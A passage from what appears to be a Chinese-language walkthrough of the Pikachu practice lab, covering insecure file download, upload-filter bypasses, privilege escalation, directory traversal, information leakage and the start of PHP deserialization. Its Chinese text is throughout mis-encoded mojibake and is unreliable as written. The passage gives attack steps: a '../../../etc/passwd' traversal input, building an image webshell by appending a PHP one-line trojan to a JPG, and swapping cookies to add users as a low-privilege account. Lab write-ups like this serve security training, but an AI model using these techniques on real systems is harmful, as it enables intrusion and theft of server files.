æ–‡ä»¶è·¯å¾„,ä»è€Œè·å–åˆ°åå°æœåŠ¡å™¨ä¸Šçš„å…¶ä»–çš„æ•æ„Ÿæ–‡ä»¶ã€‚</p><blockquote><p>æ¦‚è¿°ï¼šæ–‡ä»¶ä¸‹è½½åŠŸèƒ½åœ¨å¾ˆå¤šwebç³»ç»Ÿä¸Šéƒ½ä¼šå‡ºç°ï¼Œä¸€èˆ¬æˆ‘ä»¬å½“ç‚¹å‡»ä¸‹è½½é“¾æ¥ï¼Œä¾¿ä¼šå‘åå°å‘é€ä¸€ä¸ªä¸‹è½½è¯·æ±‚ï¼Œä¸€èˆ¬è¿™ä¸ªè¯·æ±‚ä¼šåŒ…å«ä¸€ä¸ªéœ€è¦ä¸‹è½½çš„æ–‡ä»¶åç§°ï¼Œåå°åœ¨æ”¶åˆ°è¯·æ±‚å ä¼šå¼€å§‹æ‰§è¡Œä¸‹è½½ä»£ç ï¼Œå°†è¯¥æ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶responseç»™æµè§ˆå™¨ï¼Œä»è€Œå®Œæˆä¸‹è½½ã€‚ å¦‚æœåå°åœ¨æ”¶åˆ°è¯·æ±‚çš„æ–‡ä»¶åå,å°†å…¶ç›´æ¥æ‹¼è¿›ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ä¸­è€Œä¸å¯¹å…¶è¿›è¡Œå®‰å…¨åˆ¤æ–­çš„è¯ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚<br>æ­¤æ—¶å¦‚æœ æ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„çš„æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è·¯å¾„(æ¯”å¦‚../../../etc/passwd),åˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥å°†è¯¥æŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ ä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯(å¯†ç æ–‡ä»¶ã€æºä»£ç ç­‰)è¢«ä¸‹è½½ã€‚</p><p>æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸‹è½½åŠŸèƒ½æ—¶ï¼Œå¦‚æœä¸‹è½½çš„ç›®æ ‡æ–‡ä»¶æ˜¯ç”±å‰ç«¯ä¼ è¿›æ¥çš„ï¼Œåˆ™ä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œå®‰å…¨è€ƒè™‘ã€‚ åˆ‡è®°ï¼šæ‰€æœ‰ä¸å‰ç«¯äº¤äº’çš„æ•°æ®éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œä¸èƒ½æ‰ä»¥è½»å¿ƒï¼</p><p>é˜²æŠ¤ï¼šå¯¹ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’Œé™å®šï¼Œå¯¹æ–‡ä»¶ä¸‹è½½ç›®å½•è¿›è¡Œä¸¥æ ¼é™å®š</p></blockquote><p><img src="https://i.loli.net/2021/02/14/ibeYnm19rMfz2sI.png"></p><p><img src="https://i.loli.net/2021/02/14/io6tMa83CvqN7PO.png"></p><p>æ­¤å¤„æœªå¯¹æ–‡ä»¶è·¯å¾„é™åˆ¶ï¼Œä¿®æ”¹ä¸‹è½½æ–‡ä»¶è·¯å¾„å°±ä¼šé€ æˆä»»æ„æ–‡ä»¶ä¸‹è½½</p><p>å¦‚å°†è·¯å¾„æ›´æ”¹ä¸ºâ€¦/â€¦/â€¦/â€¦/â€¦/etc/passwd</p><h1 id="ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ "><a href="#ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ "></a>ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ </h1><p>å¯ä»¥æ‰“ä¸€ä¸‹upload-libs~~~</p><blockquote><p>æ¦‚è¿°ï¼šæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½åœ¨webåº”ç”¨ç³»ç»Ÿå¾ˆå¸¸è§ï¼Œæ¯”å¦‚å¾ˆå¤šç½‘ç«™æ³¨å†Œçš„æ—¶å€™éœ€è¦ä¸Šä¼ å¤´åƒã€ä¸Šä¼ é™„ä»¶ç­‰ç­‰ã€‚å½“ç”¨æˆ·ç‚¹å‡»ä¸Šä¼ æŒ‰é’®åï¼Œåå°ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œåˆ¤æ–­ æ¯”å¦‚æ˜¯å¦æ˜¯æŒ‡å®šçš„ç±»å‹ã€åç¼€åã€å¤§å°ç­‰ç­‰ï¼Œç„¶åå°†å…¶æŒ‰ç…§è®¾è®¡çš„æ ¼å¼è¿›è¡Œé‡å‘½ååå­˜å‚¨åœ¨æŒ‡å®šçš„ç›®å½•ã€‚ å¦‚æœè¯´åå°å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œä»»ä½•çš„å®‰å…¨åˆ¤æ–­æˆ–è€…åˆ¤æ–­æ¡ä»¶ä¸å¤Ÿä¸¥è°¨ï¼Œåˆ™æ”»å‡»ç€å¯èƒ½ä¼šä¸Šä¼ ä¸€äº›æ¶æ„çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€å¥è¯æœ¨é©¬ï¼Œä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨è¢«webshellã€‚</p><p>æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ã€‚æ¯”å¦‚ï¼š<br>â€“éªŒè¯æ–‡ä»¶ç±»å‹ã€åç¼€åã€å¤§å°;<br>â€“éªŒè¯æ–‡ä»¶çš„ä¸Šä¼ æ–¹å¼;<br>â€“å¯¹æ–‡ä»¶è¿›è¡Œä¸€å®šå¤æ‚çš„é‡å‘½å;<br>â€“ä¸è¦æš´éœ²æ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„;<br>â€“ç­‰ç­‰â€¦</p></blockquote><h2 id="client-check-å®¢æˆ·ç«¯æ£€æŸ¥"><a href="#client-check-å®¢æˆ·ç«¯æ£€æŸ¥" class="headerlink" title="client check(å®¢æˆ·ç«¯æ£€æŸ¥)"></a>client check(å®¢æˆ·ç«¯æ£€æŸ¥)</h2><p>åœ¨å‰ç«¯è¿›è¡ŒéªŒè¯ï¼Œè¦æ±‚åªèƒ½ä¸Šä¼ å›¾ç‰‡ã€‚</p><p>bypassï¼š1.å°†æ–‡ä»¶åç¼€ä¿®æ”¹ç¬¦åˆå‰ç«¯è¦æ±‚ï¼Œå†æŠ“åŒ…æ”¹å›æ¥å³å¯ã€‚2.ç¦ç”¨js</p><p><img src="https://i.loli.net/2021/02/14/IQp3GW4c6diUlsx.png"></p><h2 id="MIME-type-æœåŠ¡ç«¯æ£€æŸ¥"><a href="#MIME-type-æœåŠ¡ç«¯æ£€æŸ¥" class="headerlink" title="MIME type(æœåŠ¡ç«¯æ£€æŸ¥)"></a>MIME type(æœåŠ¡ç«¯æ£€æŸ¥)</h2><p>MIME type:åª’ä½“ç±»å‹ï¼Œå¦‚å›¾ç‰‡å¯èƒ½ä¸ºimage/jpegï¼Œåº”ç”¨å¯èƒ½ä¸ºapplication/octet-stream</p><p>æ­¤å¤„åªå¯¹æ–‡ä»¶ç±»å‹è¿›è¡ŒéªŒè¯ï¼Œå°†application/octet-streamæ”¹ä¸ºimage/jpegå³å¯</p><p><img src="https://i.loli.net/2021/02/14/xMNwR8mlBVJE3kW.png"></p><p><img src="https://i.loli.net/2021/02/14/tbSnw6BFTmi5oh9.png"></p><p>æ‰¾åˆ°æ–‡ä»¶è·¯å¾„ï¼Œè®¿é—®å³å¯</p><p><img src="https://i.loli.net/2021/02/14/zRL4Tac2xZ8evt3.png"></p><h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h2><p>getimagesize()ï¼šè·å–å›¾åƒä¿¡æ¯ï¼Œè¿”å›æ–‡ä»¶å¤§å°å’Œæ–‡ä»¶ç±»å‹ã€‚å°†æµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹åŠå›¾ç‰‡é«˜åº¦ä¸å®½åº¦ã€‚</p><p>ä¼šåœ¨æœåŠ¡å™¨å¯¹å›¾ç‰‡ä¿¡æ¯è¿›è¡ŒéªŒè¯</p><p>ä¸Šä¼ å›¾ç‰‡é©¬</p><p><img src="https://i.loli.net/2021/02/14/LHtnj2JuaUR4D6g.png"></p><p>ç„¶åä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«è¯¥è·¯å¾„å³å¯</p><p>å›¾ç‰‡é©¬:</p><ol><li>å‡†å¤‡ä¸€å¼ å›¾ç‰‡ xxx1.jpg å’Œ ä¸€å¥è¯phpæœ¨é©¬ xxx2.php</li><li>åœ¨ä¸¤æ–‡ä»¶è·¯å¾„æ‰“å¼€CMD copy xxx2.php/b+xxx1.jpg  hhh.jpg</li></ol><p><img src="https://i.loli.net/2021/02/14/vrZdfAyC97i8z61.png"></p><p>ä¹Ÿå¯ä»¥ç”¨hxdæˆ–è€…010editioræ‰“å¼€xxx1ï¼Œå°†xxx2å†…å®¹æ’å…¥åˆ°æœ«å°¾</p><h1 id="è¶Šæƒ"><a href="#è¶Šæƒ" class="headerlink" title="è¶Šæƒ"></a>è¶Šæƒ</h1><blockquote><p>æ¦‚è¿°ï¼šå¦‚æœä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼ŒAçš„æƒé™å°äºBçš„æƒé™ï¼Œå¦‚æœèƒ½å¤ŸæˆåŠŸæ“ä½œï¼Œåˆ™ç§°ä¹‹ä¸ºè¶Šæƒæ“ä½œã€‚ è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº† ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚</p><p>ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹ å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œçœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´ã€‚</p><p>å› æ­¤ï¼Œåœ¨åœ¨æƒé™ç®¡ç†ä¸­åº”è¯¥éµå®ˆï¼š<br>1.ä½¿ç”¨æœ€å°æƒé™åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œèµ‹æƒ;<br>2.ä½¿ç”¨åˆç†ï¼ˆä¸¥æ ¼ï¼‰çš„æƒé™æ ¡éªŒè§„åˆ™;<br>3.ä½¿ç”¨åå°ç™»å½•æ€ä½œä¸ºæ¡ä»¶è¿›è¡Œæƒé™åˆ¤æ–­,åˆ«åŠ¨ä¸åŠ¨å°±çç”¨å‰ç«¯ä¼ è¿›æ¥çš„æ¡ä»¶;</p><p>ä½ å¯ä»¥é€šè¿‡â€œOver permissionâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</p></blockquote><h2 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ</h2><p>ä¸¤ç”¨æˆ·æ‹¥æœ‰åŒçº§æƒé™ï¼Œä½†åªèƒ½æ“ä½œè‡ªå·±çš„ä¿¡æ¯ã€‚è‹¥Aç”¨æˆ·èƒ½å®ç°å¯¹Bç”¨æˆ·çš„ä¿¡æ¯æ“ä½œï¼Œè¿™ç§åŒçº§åˆ«çš„è¶Šæƒè¡Œä¸ºç§°ä¹‹ä¸ºæ°´å¹³è¶Šæƒã€‚</p><p>ç™»é™†åç‚¹å‡»æŸ¥çœ‹ä¸ªäººä¿¡æ¯<img src="https://i.loli.net/2021/02/14/mRg3BkwIYEQVFHO.png"></p><p>urlä¸­å‚æ•°username=lucyæ›´æ”¹=ã€‹kobeï¼›å®ç°è¶Šæƒ</p><p><img src="https://i.loli.net/2021/02/14/7Ccw96tfFJHk8QA.png"></p><h2 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h2><p>Aç”¨æˆ·æƒé™é«˜äºBç”¨æˆ·ï¼ŒBç”¨æˆ·è¶Šæƒæ“ä½œAç”¨æˆ·ï¼Œè¿™ç§ä½æƒé™ç”¨æˆ·è¶Šæƒæ“ä½œé«˜æƒé™ç”¨æˆ·çš„è¡Œä¸ºç§°ä¹‹ä¸ºå‚ç›´è¶Šæƒã€‚</p><p>æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼špikachu/000000;admin/123456ï¼ˆadminä¸ºç®¡ç†å‘˜ï¼‰</p><p>pikachuä½œä¸ºæ™®é€šç”¨æˆ·åªæœ‰æŸ¥çœ‹æƒé™</p><p>adminä½œä¸ºç®¡ç†å‘˜ç”¨æˆ·å¯ä»¥æ·»åŠ å’Œåˆ é™¤ç”¨æˆ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">æºç ï¼š<br><span class="hljs-variable">$link</span>=connect();<br><br><span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œæ²¡æœ‰ç™»å½•ä¸èƒ½è®¿é—®</span><br><br><span class="hljs-comment">//è¿™é‡Œåªæ˜¯éªŒè¯äº†ç™»å½•çŠ¶æ€ï¼Œå¹¶æ²¡æœ‰éªŒè¯çº§åˆ«ï¼Œæ‰€ä»¥å­˜åœ¨è¶Šæƒé—®é¢˜ã€‚</span><br><br><span class="hljs-keyword">if</span>(!check_op2_login(<span class="hljs-variable">$link</span>))&#123;<br>    header(<span class="hljs-string">&quot;location:op2_login.php&quot;</span>);<br><br>    <span class="hljs-keyword">exit</span>();<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!=<span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]!=<span class="hljs-literal">null</span>)&#123;<span class="hljs-comment">//ç”¨æˆ·åå¯†ç å¿…å¡«</span><br><br>        <span class="hljs-variable">$getdata</span>=escape(<span class="hljs-variable">$link</span>, <span class="hljs-variable">$_POST</span>);<span class="hljs-comment">//è½¬ä¹‰</span><br><br>        <span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;username&#x27;]&#125;</span>&#x27;,md5(&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;password&#x27;]&#125;</span>&#x27;),&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;address&#x27;]&#125;</span>&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/OCyG3DBHNIjdvWu.png"></p><p>å°†æ™®é€šç”¨æˆ·çš„cookieç²˜è´´åˆ°æ·»åŠ ç”¨æˆ·æŠ“çš„åŒ…é‡Œï¼Œ</p><p><img src="https://i.loli.net/2021/02/14/VrMXx7dmsIcv3aJ.png"></p><p>å¯ä»¥çœ‹åˆ°hhhhhhæ·»åŠ è¿›å»äº†</p><p><img src="https://i.loli.net/2021/02/14/tHUlRbL5qvKgoCN.png"></p><p><img src="https://i.loli.net/2021/02/14/Xz784sFgK3Polfn.png"></p><h1 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h1><blockquote><p>æ¦‚è¿°ï¼šåœ¨webåŠŸèƒ½è®¾è®¡ä¸­,å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šè¦å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œä»è€Œè®©å‰ç«¯çš„åŠŸèƒ½ä¾¿çš„æ›´åŠ çµæ´»ã€‚ å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªå‰ç«¯çš„è¯·æ±‚æ—¶ï¼Œä¾¿ä¼šå°†è¯·æ±‚çš„è¿™ä¸ªæ–‡ä»¶çš„å€¼(æ¯”å¦‚æ–‡ä»¶åç§°)ä¼ é€’åˆ°åå°ï¼Œåå°å†æ‰§è¡Œå…¶å¯¹åº”çš„æ–‡ä»¶ã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœåå°æ²¡æœ‰å¯¹å‰ç«¯ä¼ è¿›æ¥çš„å€¼è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡â€œ../â€è¿™æ ·çš„æ‰‹æ®µè®©åå°æ‰“å¼€æˆ–è€…æ‰§è¡Œä¸€äº›å…¶ä»–çš„æ–‡ä»¶ã€‚ ä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨ä¸Šå…¶ä»–ç›®å½•çš„æ–‡ä»¶ç»“æœè¢«éå†å‡ºæ¥ï¼Œå½¢æˆç›®å½•éå†æ¼æ´ã€‚</p><p>çœ‹åˆ°è¿™é‡Œ,ä½ å¯èƒ½ä¼šè§‰å¾—ç›®å½•éå†æ¼æ´å’Œä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ï¼Œç”šè‡³æ–‡ä»¶åŒ…å«æ¼æ´æœ‰å·®ä¸å¤šçš„æ„æ€ï¼Œæ˜¯çš„ï¼Œç›®å½•éå†æ¼æ´å½¢æˆçš„æœ€ä¸»è¦çš„åŸå› è·Ÿè¿™ä¸¤è€…ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨åŠŸèƒ½è®¾è®¡ä¸­å°†è¦æ“ä½œçš„æ–‡ä»¶ä½¿ç”¨å˜é‡çš„ æ–¹å¼ä¼ é€’ç»™äº†åå°ï¼Œè€Œåˆæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘è€Œé€ æˆçš„ï¼Œåªæ˜¯å‡ºç°çš„ä½ç½®æ‰€å±•ç°çš„ç°è±¡ä¸ä¸€æ ·ï¼Œå› æ­¤ï¼Œè¿™é‡Œè¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥å®šä¹‰ä¸€ä¸‹ã€‚</p><p>éœ€è¦åŒºåˆ†ä¸€ä¸‹çš„æ˜¯,å¦‚æœä½ é€šè¿‡ä¸å¸¦å‚æ•°çš„urlï¼ˆæ¯”å¦‚ï¼š<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82">http://xxxx/docï¼‰åˆ—å‡ºäº†docæ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</a> è€Œå¹¶ä¸å½’ä¸ºç›®å½•éå†æ¼æ´ã€‚ï¼ˆå…³äºæ•æ„Ÿä¿¡æ¯æ³„éœ²ä½ ä½ å¯ä»¥åœ¨â€i can see you ABCâ€ä¸­äº†è§£æ›´å¤šï¼‰</p></blockquote><p><img src="https://i.loli.net/2021/02/14/8b5eYIXdHhmA1LR.png"></p><p>ä¿®æ”¹è·¯å¾„å³å¯</p><h1 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h1><blockquote><p>æ¦‚è¦ï¼šç”±äºåå°äººå‘˜çš„ç–å¿½æˆ–è€…ä¸å½“çš„è®¾è®¡ï¼Œå¯¼è‡´ä¸åº”è¯¥è¢«å‰ç«¯ç”¨æˆ·çœ‹åˆ°çš„æ•°æ®è¢«è½»æ˜“çš„è®¿é—®åˆ°ã€‚ æ¯”å¦‚ï¼š<br>â€”é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;<br>â€”è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;<br>â€”å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;</p><p>ç±»ä¼¼ä»¥ä¸Šè¿™äº›æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚æ•æ„Ÿä¿¡æ¯æ³„éœ²è™½ç„¶ä¸€ç›´è¢«è¯„ä¸ºå±å®³æ¯”è¾ƒä½çš„æ¼æ´ï¼Œä½†è¿™äº›æ•æ„Ÿä¿¡æ¯å¾€å¾€ç»™æ”»å‡»ç€å®æ–½è¿›ä¸€æ­¥çš„æ”»å‡»æä¾›å¾ˆå¤§çš„å¸®åŠ©,ç”šè‡³â€œç¦»è°±â€çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ä¹Ÿä¼šç›´æ¥é€ æˆä¸¥é‡çš„æŸå¤±ã€‚ å› æ­¤,åœ¨webåº”ç”¨çš„å¼€å‘ä¸Šï¼Œé™¤äº†è¦è¿›è¡Œå®‰å…¨çš„ä»£ç ç¼–å†™ï¼Œä¹Ÿéœ€è¦æ³¨æ„å¯¹æ•æ„Ÿä¿¡æ¯çš„åˆç†å¤„ç†ã€‚</p><p>ä½ å¯ä»¥é€šè¿‡â€œi can see your abcâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</p></blockquote><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼š</p><p><img src="https://i.loli.net/2021/02/14/t4gX9LirypKnR6O.png"></p><p>ç™»é™†åè¿›å…¥abc.phpï¼›ä¹Ÿå¯ä»¥ç›´æ¥åœ¨urlè¾“å…¥abc.phpè¿›å…¥æ­¤ç•Œé¢</p><p><img src="https://i.loli.net/2021/02/14/IH5roqGO6zaDbs4.png"></p><h1 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h1><p>å…ˆäº†è§£ä¸¤ä¸ªå‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">serialize()ï¼šå°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">unserialize()ï¼šå°†å­—ç¬¦ä¸²è¿˜åŸä¸ºä¸€ä¸ªå¯¹è±¡<br></code></pre></td></tr></table></figure><p>åºåˆ—åŒ–ï¼šå°†å˜é‡æˆ–å¯¹è±¡è½¬æ¢ä¸ºå¯ä¿å­˜æˆ–ä¼ è¾“çš„å­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼›åœ¨phpä¸­ä½¿ç”¨<code>serialize()</code>å®ç° å°†ç±»è¿›è¡Œåºåˆ—åŒ–çš„è¿‡ç¨‹</p><p>ååºåˆ—åŒ–ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆå˜é‡æˆ–å¯¹è±¡çš„è¿‡ç¨‹ï¼›åœ¨phpä¸­ä½¿ç”¨<code>unserialize()</code>å®ç°</p><blockquote><p>å®˜æ–¹æ–‡æ¡£ï¼šæ‰€æœ‰phpé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°<a href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a>æ¥è¿”å›ä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚<a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>å‡½æ•°èƒ½å¤Ÿé‡æ–°æŠŠå­—ç¬¦ä¸²å˜å›phpåŸæ¥çš„å€¼ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚</p><p>ä¸ºäº†èƒ½å¤Ÿ<a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„ç±»å¿…é¡»å·²ç»å®šä¹‰è¿‡ã€‚å¦‚æœåºåˆ—åŒ–ç±»Açš„ä¸€ä¸ªå¯¹è±¡ï¼Œå°†ä¼šè¿”å›ä¸€ä¸ªè·Ÿç±»Aç›¸å…³ï¼Œè€Œä¸”åŒ…å«äº†å¯¹è±¡æ‰€æœ‰å˜é‡å€¼çš„å­—ç¬¦ä¸²ã€‚ å¦‚æœè¦æƒ³åœ¨å¦å¤–ä¸€ä¸ªæ–‡ä»¶ä¸­è§£åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„ç±»å¿…é¡»åœ¨è§£åºåˆ—åŒ–ä¹‹å‰å®šä¹‰ï¼Œå¯ä»¥é€šè¿‡åŒ…å«ä¸€ä¸ªå®šä¹‰è¯¥ç±»çš„æ–‡ä»¶æˆ–ä½¿ç”¨å‡½æ•°<a href="https://www.php.net/manual/zh/function.spl-autoload-register.php">spl_autoload_register()</a>æ¥å®ç°ã€‚</p></blockquote><p>eg:å…ˆè®¾ç½®ä¸€ä¸ªç±» 